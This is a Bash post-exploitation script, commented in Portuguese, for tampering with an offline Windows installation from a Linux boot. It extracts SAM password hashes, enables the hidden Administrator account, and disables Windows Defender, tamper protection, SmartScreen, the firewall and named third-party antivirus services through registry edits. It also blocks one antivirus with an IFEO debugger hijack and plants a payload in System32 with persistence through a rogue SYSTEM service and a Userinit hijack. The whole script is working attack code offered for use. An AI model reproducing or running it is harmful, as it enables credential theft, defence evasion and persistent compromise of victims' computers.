#!/bin/bash

# --- CONFIGURAÇÕES ---
PAYLOAD="Windows.exe"
PAYLOAD_PATH="C:\\Windows\\System32\\$PAYLOAD"
DEST_DIR="$HOME/Desktop/Post_Exploitation"

# Lista de Endpoints e AVs (ekrn=ESET, avp=Kaspersky, etc.)
AV_SERVICES=("ekrn" "epfw" "avp" "SmadavService" "Smadav" "SentinelAgent" "SepMasterService" "McAfeeFramework")

echo "[+] INICIANDO OPERAÇÃO FINAL: DESTRUIÇÃO TOTAL DE DEFESAS"

# 1. MONTAGEM E REPARAÇÃO
MOUNT_POINT=$(mount | grep -i "ntfs" | awk '{print $3}' | while read m; do [ -f "$m/Windows/System32/ntoskrnl.exe" ] && echo "$m" && break; done)
if [ -z "$MOUNT_POINT" ]; then echo "[-] Erro: Windows não encontrado."; exit 1; fi

PARTICAO=$(mount | grep "$MOUNT_POINT" | awk '{print $1}')
sudo ntfsfix "$PARTICAO" &>/dev/null

SOFTWARE="$MOUNT_POINT/Windows/System32/config/SOFTWARE"
SYSTEM="$MOUNT_POINT/Windows/System32/config/SYSTEM"
SAM="$MOUNT_POINT/Windows/System32/config/SAM"

mkdir -p "$DEST_DIR"

# 2. EXTRAÇÃO DE HASHES (SAM & SYSTEM)
echo "[*] Extraindo hashes do sistema..."
sudo samdump2 "$SYSTEM" "$SAM" > "$DEST_DIR/hashes.txt"

# 3. ATIVAÇÃO DE ADMINISTRADOR OCULTO
# [NOTA]: Para desativar, mude o valor '11' para '10' no comando abaixo
echo "[*] Ativando conta Administrator oculta..."
printf "cd Domains\\\\Account\\\\Users\\\\000001F4\ned F\n11\nq\ny\n" | sudo chntpw -i "$SAM" &>/dev/null

# 4. DESTRUIÇÃO DO WINDOWS DEFENDER & SMART SCREEN
echo "[*] Desabilitando Defender (Real-Time, Tamper, AntiSpyware)..."
printf "cd Microsoft\\\\Windows Defender\nnv 4 DisableAntiSpyware\ned DisableAntiSpyware\n1\ncd Real-Time Protection\nnv 4 DisableRealtimeMonitoring\ned DisableRealtimeMonitoring\n1\ncd ..\\\\Features\nnv 4 TamperProtection\ned TamperProtection\n0\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null

echo "[*] Desabilitando SmartScreen..."
printf "cd Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\nnv 4 SmartScreenEnabled\ned SmartScreenEnabled\nOff\ncd ..\\\\..\\\\AppHost\nnv 4 EnableSmartScreen\ned EnableSmartScreen\n0\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null

# 5. FIREWALL E NOTIFICAÇÕES DO SISTEMA
echo "[*] Derrubando Firewall e Central de Notificações..."
printf "cd ControlSet001\\\\Services\\\\mpssvc\ned Start\n4\ncd ..\\\\WscSvc\ned Start\n4\nq\ny\n" | sudo chntpw -e "$SYSTEM" &>/dev/null
# Desativar balões de notificação (Security Center)
printf "cd Microsoft\\\\Windows\\\\CurrentVersion\\\\ImmersiveShell\nnv 4 UseActionCenterExperience\ned UseActionCenterExperience\n0\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null

# 6. NEUTRALIZAÇÃO DE AVs DE TERCEIROS (ESET, SMADAV, ETC)
for svc in "${AV_SERVICES[@]}"; do
    printf "cd ControlSet001\\\\Services\\\\$svc\ned Start\n4\nq\ny\n" | sudo chntpw -e "$SYSTEM" &>/dev/null
done

# Bloqueio IFEO (Impede que o executável do AV sequer tente abrir)
printf "cd Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\nnewkey Smadav.exe\ncd Smadav.exe\nnv 1 Debugger\ned Debugger\nsvchost.exe\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null

# 7. PERSISTÊNCIA DUPLA (SYSTEM SERVICE + USERINIT)
echo "[+] Implantando Persistência de Nível SYSTEM..."

# A) Criar Serviço de Sistema (Roda como SYSTEM antes do login)
printf "cd ControlSet001\\\\Services\nnewkey WinHostSvc\ncd WinHostSvc\nnv 4 Start\ned Start\n2\nnv 4 Type\ned Type\n16\nnv 1 ImagePath\ned ImagePath\n$PAYLOAD_PATH\nq\ny\n" | sudo chntpw -e "$SYSTEM" &>/dev/null

# B) Userinit Hijack (Redundância no login do usuário)
printf "cd Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\ned Userinit\nC:\\\\Windows\\\\system32\\\\userinit.exe,cmd /c start $PAYLOAD_PATH\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null

# 8. DEPLOY DO BINÁRIO
if [ -f "./$PAYLOAD" ]; then
    sudo cp "./$PAYLOAD" "$MOUNT_POINT/Windows/System32/"
    sync
    echo "[!] OPERAÇÃO CONCLUÍDA. Payload em System32, Hashes em Desktop, Defesas Mortas."
else
    echo "[!] ALERTA: $PAYLOAD não encontrado para cópia!"
fi
